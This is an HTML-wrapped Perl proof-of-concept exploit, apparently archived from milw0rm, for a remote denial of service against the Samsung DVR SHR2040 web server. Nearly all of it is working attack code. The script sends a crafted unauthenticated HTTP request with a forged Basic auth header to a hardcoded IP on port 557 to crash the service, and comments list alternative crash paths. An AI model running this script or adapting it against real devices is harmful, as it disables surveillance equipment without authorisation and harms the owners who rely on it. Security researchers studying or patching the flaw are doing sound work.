<html><head><title>Samsung DVR SHR2040 HTTPD Remote Denial of Service DoS PoC</title></head><pre>#!/usr/bin/perl -w
#
# Samsung DVR SHR2040 HTTPD Remote Denial of Service DoS PoC
#
# The vulnerability is caused due to an unspecified error in the cgis
# files filter used for configure propierties. This can be exploited by
# sending a specially crafted HTTP request (NO necessary authentication), 
# which will cause the HTTP service on the system to crash.
#
# Requisites: Test default ports:
#
# PORT STATE SERVICE
# 554/tcp open rtsp
# 557/tcp open openvms-sysipc
#
# The vulnerability has been reported in versions Samsung DVR
#
# Firmware Version B3.03E-K1.53-V2.19_0705281908, Model = SHR2040
#
# More information: 	http://www.samsung.com
#			http://www.sybsecurity.com
#
# Very special credits: str0ke, Kf, rathaous, !dsr, 0dd.
#
# and friends: nitr0us, crypkey, dex, xdawn, sirdarckcat, kuza55,
# pikah, codebreak, h3llfyr3, canit0.
#
# Alex Hernandez ahernandez [at] sybsecurity dot com
#

use strict;
use LWP;
use Data::Dumper;
require HTTP::Request;
require HTTP::Headers;

my $string = 	&quot;/x&quot;;				# Strings to send
my $method = 	'GET';				# Method &quot;GET&quot; or &quot;POST&quot;
my $uri = 	'http://10.50.10.248:557';	# IP address:port (change this)
my $content = 	&quot;/test.html&quot;;			# Paths to crash

#my $content = 	&quot;/first.htm&quot;;
#my $content = 	&quot;/content_frame.htm?cgiName=&quot;;
#my $content = 	&quot;/index_menu.htm?lang=en&amp;topMenu=&quot;;

my $headers = HTTP::Headers-&gt;new(

'Accept:'               =&gt; '*/*',
'Referer:'       	=&gt; 'http://$1$9hC8DmrL$8NG8i3pQXBabAKo.AIm8U.:12345@10.50.10.248:557',
'Accept-Language:'     	=&gt; 'en-us,en;q=0.5',
'UA-CPU:'          	=&gt; 'x86',
'Accept-Encoding:'      =&gt; 'gzip, deflate',
'User-Agent:'   	=&gt; 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
'Host:'          	=&gt; '10.50.10.248:557',
'Connection'          	=&gt; 'keep-alive',
'Authorization:'	=&gt; 'Basic JDEkOWhDOERtckwkOE5HOGkzcFFYQmFiQUtvLkFJbThVLjoxMjM0NQ==', # base64 encode ADMIN:12345

);

my $request = HTTP::Request-&gt;new($method, $uri, $headers, $content, $string);

my $ua = LWP::UserAgent-&gt;new;
my $response = $ua-&gt;request($request);

print &quot;[+] Denial of Service exploit for Samsung SHR2040 Final\n&quot;;
print &quot;[+] Coded by: Alex Hernandez [ahernandez\@sybsecurity.com]\n&quot;;
print &quot;[+] We got this response from DVR: \n\n&quot; . $response-&gt;content . &quot;\n&quot;;

my $data;
	foreach my $pair (split('&amp;', $response-&gt;content)) {
 		my ($k, $v) = split('=', $pair);
		$data-&gt;{$k} = $v;
}

if ($data-&gt;{RESULT} != 0) {

	print &quot;[+] Denial of Service exploit for Samsung SHR2040 Final\n&quot;;
	print &quot;[+] Coded by: Alex Hernandez[ahernandez\@sybsecurity.com]\n&quot;;
	print &quot;[+] Use:\n&quot;;
	print &quot;\tperl -x dos_dvrsamsung.pl\n&quot;;
 	print $data-&gt;{RESPMSG} . &quot;\n&quot;;
	exit(0);

} else {

 	print &quot;[+] Denial of service Exploit successed!!!\n&quot;;
	print &quot;[+] By Alex Hernandez[ahernandez\@sybsecurity.com]\n&quot;;

}

# milw0rm.com [2008-09-07]</pre></html>